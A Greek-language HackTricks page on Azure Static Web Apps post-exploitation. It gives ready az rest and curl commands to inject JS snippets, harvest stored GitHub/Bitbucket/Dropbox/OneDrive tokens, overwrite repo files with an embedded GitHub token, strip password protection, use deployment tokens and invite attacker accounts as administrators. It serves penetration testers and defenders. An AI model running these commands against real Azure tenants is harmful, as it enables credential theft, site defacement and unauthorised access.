# Az - Static Web Apps Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Azure Static Web Apps

Για περισσότερες πληροφορίες σχετικά με αυτή την υπηρεσία, ελέγξτε:

{{#ref}}
../az-services/az-static-web-apps.md
{{#endref}}

### Microsoft.Web/staticSites/snippets/write

Είναι δυνατόν να φορτώσετε μια στατική ιστοσελίδα με αυθαίρεο HTML κώδικα δημιουργώντας ένα snippet. Αυτό θα μπορούσε να επιτρέψει σε έναν επιτιθέμενο να εισάγει κώδικα JS μέσα στην εφαρμογή ιστού και να κλέψει ευαίσθητες πληροφορίες όπως διαπιστευτήρια ή μνημονικούς κωδικούς (σε πορτοφόλια web3).

Η παρακάτω εντολή δημιουργεί ένα snippet που θα φορτώνεται πάντα από την εφαρμογή ιστού::
```bash
az rest \
--method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/snippets/<snippet-name>?api-version=2022-03-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"name": "supersnippet",
"location": "Body",
"applicableEnvironmentsMode": "AllEnvironments",
"content": "PHNjcmlwdD4KYWxlcnQoIkF6dXJlIFNuaXBwZXQiKQo8L3NjcmlwdD4K",
"environments": [],
"insertBottom": false
}
}'
```
### Διαβάστε τις Ρυθμισμένες Πιστοποιήσεις Τρίτων

Όπως εξηγήθηκε στην ενότητα App Service:

{{#ref}}
../az-privilege-escalation/az-app-services-privesc.md
{{#endref}}

Εκτελώντας την παρακάτω εντολή είναι δυνατόν να **διαβάσετε τις πιστοποιήσεις τρίτων** που είναι ρυθμισμένες στον τρέχοντα λογαριασμό. Σημειώστε ότι αν για παράδειγμα κάποιες πιστοποιήσεις Github είναι ρυθμισμένες σε διαφορετικό χρήστη, δεν θα μπορείτε να αποκτήσετε πρόσβαση στο token από έναν διαφορετικό.
```bash
az rest --method GET \
--url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
```
Αυτή η εντολή επιστρέφει tokens για το Github, Bitbucket, Dropbox και OneDrive.

Εδώ έχετε μερικά παραδείγματα εντολών για να ελέγξετε τα tokens:
```bash
# GitHub – List Repositories
curl -H "Authorization: token <token>" \
-H "Accept: application/vnd.github.v3+json" \
https://api.github.com/user/repos

# Bitbucket – List Repositories
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://api.bitbucket.org/2.0/repositories

# Dropbox – List Files in Root Folder
curl -X POST https://api.dropboxapi.com/2/files/list_folder \
-H "Authorization: Bearer <token>" \
-H "Content-Type: application/json" \
--data '{"path": ""}'

# OneDrive – List Files in Root Folder
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://graph.microsoft.com/v1.0/me/drive/root/children
```
### Overwrite file - Overwrite routes, HTML, JS...

Είναι δυνατόν να **επικαλύψετε ένα αρχείο μέσα στο Github repo** που περιέχει την εφαρμογή μέσω του Azure, στέλνοντας ένα αίτημα όπως το παρακάτω, το οποίο θα υποδεικνύει τη διαδρομή του αρχείου που θα επικαλυφθεί, το περιεχόμενο του αρχείου και το μήνυμα commit.

Αυτό μπορεί να καταχραστεί από επιτιθέμενους για να **αλλάξουν το περιεχόμενο της διαδικτυακής εφαρμογής** ώστε να σερβίρουν κακόβουλο περιεχόμενο (να κλέψουν διαπιστευτήρια, μνημονικές κλειδιά...) ή απλώς για να **ανακατευθύνουν ορισμένες διαδρομές** στους δικούς τους διακομιστές επικαλύπτοντας το αρχείο `staticwebapp.config.json`.

> [!WARNING]
> Σημειώστε ότι αν ένας επιτιθέμενος καταφέρει να παραβιάσει το Github repo με οποιονδήποτε τρόπο, μπορεί επίσης να επικαλύψει το αρχείο απευθείας από το Github.
```bash
curl -X PUT "https://functions.azure.com/api/github/updateGitHubContent" \
-H "Content-Type: application/json" \
-d '{
"commit": {
"message": "Update static web app route configuration",
"branchName": "main",
"committer": {
"name": "Azure App Service",
"email": "donotreply@microsoft.com"
},
"contentBase64Encoded": "ewogICJuYXZpZ2F0aW9uRmFsbGJhY2siOiB7CiAgICAicmV3cml0ZSI6ICIvaW5kZXguaHRtbCIKICB9LAogICJyb3V0ZXMiOiBbCiAgICB7CiAgICAgICJyb3V0ZSI6ICIvcHJvZmlsZSIsCiAgICAgICJtZXRob2RzIjogWwogICAgICAgICJnZXQiLAogICAgICAgICJoZWFkIiwKICAgICAgICAicG9zdCIKICAgICAgXSwKICAgICAgInJld3JpdGUiOiAiL3AxIiwKICAgICAgInJlZGlyZWN0IjogIi9sYWxhbGEyIiwKICAgICAgInN0YXR1c0NvZGUiOiAzMDEsCiAgICAgICJhbGxvd2VkUm9sZXMiOiBbCiAgICAgICAgImFub255bW91cyIKICAgICAgXQogICAgfQogIF0KfQ==",
"filePath": "staticwebapp.config.json",
"message": "Update static web app route configuration",
"repoName": "carlospolop/my-first-static-web-app",
"sha": "4b6165d0ad993a5c705e8e9bb23b778dff2f9ca4"
},
"gitHubToken": "gho_1OSsm834ai863yKkdwHGj31927PCFk44BAXL"
}'
```
### Microsoft.Web/staticSites/config/write

Με αυτή την άδεια, είναι δυνατόν να **τροποποιηθεί ο κωδικός πρόσβασης** που προστατεύει μια στατική εφαρμογή ιστού ή ακόμη και να αφαιρεθεί η προστασία από κάθε περιβάλλον στέλνοντας ένα αίτημα όπως το παρακάτω:
```bash
# Change password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"password": "SuperPassword123.",
"secretUrl": "",
"applicableEnvironmentsMode": "AllEnvironments"
}
}'



# Remove the need of a password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"secretUrl": "",
"applicableEnvironmentsMode": "SpecifiedEnvironments",
"secretState": "None"
}
}'
```
### Microsoft.Web/staticSites/listSecrets/action

Αυτή η άδεια επιτρέπει την απόκτηση του **API key deployment token** για την στατική εφαρμογή:
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/listSecrets?api-version=2023-01-01"
```
Στη συνέχεια, για να **ενημερώσετε μια εφαρμογή χρησιμοποιώντας το token** μπορείτε να εκτελέσετε την παρακάτω εντολή. Σημειώστε ότι αυτή η εντολή εξήχθη ελέγχοντας **πώς λειτουργεί το Github Action [https://github.com/Azure/static-web-apps-deploy](https://github.com/Azure/static-web-apps-deploy)**, καθώς είναι αυτή που έχει ορίσει το Azure ως προεπιλογή. Έτσι, η εικόνα και οι παράμετροι μπορεί να αλλάξουν στο μέλλον.

> [!TIP]
> Για να αναπτύξετε την εφαρμογή μπορείτε να χρησιμοποιήσετε το **`swa`** εργαλείο από [https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token](https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token) ή να ακολουθήσετε τα παρακάτω βήματα:

1. Κατεβάστε το repo [https://github.com/staticwebdev/react-basic](https://github.com/staticwebdev/react-basic) (ή οποιοδήποτε άλλο repo θέλετε να αναπτύξετε) και εκτελέστε `cd react-basic`.
2. Αλλάξτε τον κώδικα που θέλετε να αναπτύξετε
3. Αναπτύξτε το εκτελώντας (Θυμηθείτε να αλλάξετε το `<api-token>`):
```bash
docker run --rm -v $(pwd):/mnt mcr.microsoft.com/appsvc/staticappsclient:stable INPUT_AZURE_STATIC_WEB_APPS_API_TOKEN=<api-token> INPUT_APP_LOCATION="/mnt" INPUT_API_LOCATION="" INPUT_OUTPUT_LOCATION="build" /bin/staticsites/StaticSitesClient upload --verbose
```
> [!WARNING]
> Ακόμα και αν έχετε το token, δεν θα μπορείτε να αναπτύξετε την εφαρμογή αν η **Πολιτική Εξουσιοδότησης Ανάπτυξης** είναι ρυθμισμένη σε **Github**. Για να χρησιμοποιήσετε το token, θα χρειαστείτε την άδεια `Microsoft.Web/staticSites/write` για να αλλάξετε τη μέθοδο ανάπτυξης ώστε να χρησιμοποιεί το API token.

### Microsoft.Web/staticSites/write

Με αυτή την άδεια είναι δυνατόν να **αλλάξετε την πηγή της στατικής εφαρμογής ιστού σε ένα διαφορετικό αποθετήριο Github**, ωστόσο, δεν θα προμηθευτεί αυτόματα καθώς αυτό πρέπει να γίνει από μια ενέργεια Github.

Ωστόσο, αν η **Πολιτική Εξουσιοδότησης Ανάπτυξης** είναι ρυθμισμένη σε **Github**, είναι δυνατόν να **ενημερώσετε την εφαρμογή από το νέο αποθετήριο πηγής!**.

Σε περίπτωση που η **Πολιτική Εξουσιοδότησης Ανάπτυξης** δεν είναι ρυθμισμένη σε Github, μπορείτε να την αλλάξετε με την ίδια άδεια `Microsoft.Web/staticSites/write`.
```bash
# Change the source to a different Github repository
az staticwebapp update --name my-first-static-web-app --resource-group Resource_Group_1 --source https://github.com/carlospolop/my-first-static-web-app -b main

# Update the deployment method to Github
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>?api-version=2022-09-01" \
--headers 'Content-Type=application/json' \
--body '{
"properties": {
"allowConfigFileUpdates": true,
"stagingEnvironmentPolicy": "Enabled",
"buildProperties": {
"appLocation": "/",
"apiLocation": "",
"appArtifactLocation": "build"
},
"deploymentAuthPolicy": "GitHub",
"repositoryToken": "<github_token>" # az rest --method GET --url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
}
}'
```
Παράδειγμα Github Action για την ανάπτυξη της εφαρμογής:
```yaml
name: Azure Static Web Apps CI/CD

on:
push:
branches:
- main
pull_request:
types: [opened, synchronize, reopened, closed]
branches:
- main

jobs:
build_and_deploy_job:
if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')
runs-on: ubuntu-latest
name: Build and Deploy Job
permissions:
id-token: write
contents: read
steps:
- uses: actions/checkout@v3
with:
submodules: true
lfs: false
- name: Install OIDC Client from Core Package
run: npm install @actions/core@1.6.0 @actions/http-client
- name: Get Id Token
uses: actions/github-script@v6
id: idtoken
with:
script: |
const coredemo = require('@actions/core')
return await coredemo.getIDToken()
result-encoding: string
- name: Build And Deploy
id: builddeploy
uses: Azure/static-web-apps-deploy@v1
with:
azure_static_web_apps_api_token: "12345cbb198a77a092ff885782a62a15d5aef5e3654cac1234509ab54547270704-4140ccee-e04f-424f-b4ca-3d4dd123459c00f0702071d12345" # A valid formatted token is needed although it won't be used for authentication
action: "upload"
###### Repository/Build Configurations - These values can be configured to match your app requirements. ######
# For more information regarding Static Web App workflow configurations, please visit: https://aka.ms/swaworkflowconfig
app_location: "/" # App source code path
api_location: "" # Api source code path - optional
output_location: "build" # Built app content directory - optional
github_id_token: ${{ steps.idtoken.outputs.result }}
###### End of Repository/Build Configurations ######

close_pull_request_job:
if: github.event_name == 'pull_request' && github.event.action == 'closed'
runs-on: ubuntu-latest
name: Close Pull Request Job
steps:
- name: Close Pull Request
id: closepullrequest
uses: Azure/static-web-apps-deploy@v1
with:
action: "close"
```
### Microsoft.Web/staticSites/resetapikey/action

Με αυτή την άδεια είναι δυνατή η **επανεκκίνηση του API key της στατικής εφαρμογής ιστού**, πιθανώς προκαλώντας DoS στους ροές εργασίας που αναπτύσσουν αυτόματα την εφαρμογή.
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/resetapikey?api-version=2019-08-01"
```
### Microsoft.Web/staticSites/createUserInvitation/action

Αυτή η άδεια επιτρέπει να **δημιουργηθεί μια πρόσκληση σε έναν χρήστη** για να έχει πρόσβαση σε προστατευμένες διαδρομές μέσα σε μια στατική εφαρμογή ιστού με έναν συγκεκριμένο ρόλο.

Η σύνδεση βρίσκεται σε μια διαδρομή όπως `/.auth/login/github` για το github ή `/.auth/login/aad` για το Entra ID και ένας χρήστης μπορεί να προσκληθεί με την ακόλουθη εντολή:
```bash
az staticwebapp users invite \
--authentication-provider Github # AAD, Facebook, GitHub, Google, Twitter \
--domain mango-beach-071d9340f.4.azurestaticapps.net # Domain of the app \
--invitation-expiration-in-hours 168 # 7 days is max \
--name my-first-static-web-app # Name of the app\
--roles "contributor,administrator" # Comma sepparated list of roles\
--user-details username # Github username in this case\
--resource-group Resource_Group_1 # Resource group of the app
```
### Pull Requests

Κατά προεπιλογή, οι Pull Requests από ένα branch στο ίδιο repo θα συντάσσονται και θα κατασκευάζονται αυτόματα σε ένα περιβάλλον staging. Αυτό θα μπορούσε να καταχραστεί από έναν επιτιθέμενο με δικαιώματα εγγραφής στο repo αλλά χωρίς να μπορεί να παρακάμψει τις προστασίες του branch παραγωγής (συνήθως `main`) για να **αναπτύξει μια κακόβουλη έκδοση της εφαρμογής** στη διεύθυνση URL του staging.

Η διεύθυνση URL του staging έχει αυτή τη μορφή: `https://<app-subdomain>-<PR-num>.<region>.<res-of-app-domain>` όπως: `https://ambitious-plant-0f764e00f-2.eastus2.4.azurestaticapps.net`

> [!TIP]
> Σημειώστε ότι κατά προεπιλογή οι εξωτερικές PR δεν θα εκτελούν workflows εκτός αν έχουν συγχωνευθεί τουλάχιστον 1 PR στο αποθετήριο. Ένας επιτιθέμενος θα μπορούσε να στείλει μια έγκυρη PR στο repo και **στη συνέχεια να στείλει μια κακόβουλη PR** στο repo για να αναπτύξει την κακόβουλη εφαρμογή στο περιβάλλον staging. Ωστόσο, υπάρχει μια απροσδόκητη προστασία, η προεπιλεγμένη Github Action για την ανάπτυξη στην στατική web εφαρμογή χρειάζεται πρόσβαση στο μυστικό που περιέχει το token ανάπτυξης (όπως `secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_AMBITIOUS_PLANT_0F764E00F`) ακόμα και αν η ανάπτυξη γίνεται με το IDToken. Αυτό σημαίνει ότι επειδή μια εξωτερική PR δεν θα έχει πρόσβαση σε αυτό το μυστικό και μια εξωτερική PR δεν μπορεί να αλλάξει το Workflow για να τοποθετήσει εδώ ένα αυθαίρετο token χωρίς να γίνει αποδεκτή μια PR, **αυτή η επίθεση δεν θα λειτουργήσει πραγματικά**.

{{#include ../../../banners/hacktricks-training.md}}
